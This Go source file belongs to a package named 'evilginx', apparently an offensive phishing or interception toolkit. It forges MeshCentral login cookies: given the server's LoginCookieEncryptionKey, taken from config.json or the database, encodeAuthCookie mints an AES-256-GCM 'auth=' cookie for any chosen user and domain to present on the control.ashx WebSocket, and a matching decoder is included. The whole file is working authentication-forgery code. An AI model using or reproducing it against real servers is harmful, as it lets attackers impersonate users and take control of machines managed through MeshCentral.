package evilginx

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"time"
)

// encodeAuthCookie produces the "auth=" cookie value MeshCentral expects on
// its control.ashx WebSocket. It mirrors meshcentral.js encodeCookie():
//
//	AES-256-GCM(key[:32], iv=[12 bytes]) over `{"userid":..., "domainid":..., "time":...}`
//	wire layout: iv || authTag || ciphertext
//	then base64 with '+' -> '@' and '/' -> '$'
//
// keyHex is the 80-byte (160 hex chars) LoginCookieEncryptionKey — either the
// value of settings.logincookieencryptionkey in the server config.json or the
// LoginCookieEncryptionKey record in the server database. Only the first 32
// bytes are used as the cipher key.
func encodeAuthCookie(userID string, domainID string, key []byte, now time.Time) (string, error) {
	if len(key) < 32 {
		return "", fmt.Errorf("evilginx: login cookie key is %d bytes, need >= 32", len(key))
	}
	block, err := aes.NewCipher(key[:32])
	if err != nil {
		return "", fmt.Errorf("evilginx: aes: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("evilginx: gcm: %w", err)
	}

	payload, err := json.Marshal(map[string]interface{}{
		"userid":   userID,
		"domainid": domainID,
		"time":     now.Unix(),
	})
	if err != nil {
		return "", err
	}

	iv := make([]byte, 12)
	if _, err := rand.Read(iv); err != nil {
		return "", fmt.Errorf("evilginx: iv: %w", err)
	}
	// GCM.Seal appends the 16-byte tag to the ciphertext.
	sealed := gcm.Seal(nil, iv, payload, nil)
	ctLen := len(sealed) - gcm.Overhead()

	wire := make([]byte, 0, len(iv)+len(sealed))
	wire = append(wire, iv...)
	wire = append(wire, sealed[ctLen:]...) // authTag
	wire = append(wire, sealed[:ctLen]...) // ciphertext

	enc := base64.StdEncoding.EncodeToString(wire)
	enc = replaceAll(enc, '+', '@')
	enc = replaceAll(enc, '/', '$')
	return enc, nil
}

// decodeAuthCookie is the inverse of encodeAuthCookie, implemented for tests
// and for verifying self-generated cookies. It restores '+'/'-' style base64
// and decrypts the same way MeshCentral's decodeCookieAESGCM does.
func decodeAuthCookie(cookie string, key []byte) (map[string]interface{}, error) {
	if len(key) < 32 {
		return nil, fmt.Errorf("evilginx: login cookie key is %d bytes, need >= 32", len(key))
	}
	enc := replaceAll(cookie, '@', '+')
	enc = replaceAll(enc, '$', '/')
	raw, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return nil, fmt.Errorf("evilginx: base64: %w", err)
	}
	if len(raw) < 28 {
		return nil, fmt.Errorf("evilginx: cookie too short: %d bytes", len(raw))
	}
	block, err := aes.NewCipher(key[:32])
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	iv := raw[:12]
	tag := raw[12:28]
	ct := raw[28:]
	plain, err := gcm.Open(nil, iv, append(ct, tag...), nil)
	if err != nil {
		return nil, fmt.Errorf("evilginx: gcm open: %w", err)
	}
	var o map[string]interface{}
	if err := json.Unmarshal(plain, &o); err != nil {
		return nil, err
	}
	return o, nil
}

// loginKeyFromHex validates an 80-byte login cookie encryption key string.
func loginKeyFromHex(keyHex string) ([]byte, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, fmt.Errorf("evilginx: login key is not hex: %w", err)
	}
	if len(key) < 32 {
		return nil, fmt.Errorf("evilginx: login key decodes to %d bytes, need >= 32", len(key))
	}
	return key, nil
}

func replaceAll(s string, old, new rune) string {
	out := make([]rune, 0, len(s))
	for _, r := range s {
		if r == old {
			out = append(out, new)
		} else {
			out = append(out, r)
		}
	}
	return string(out)
}
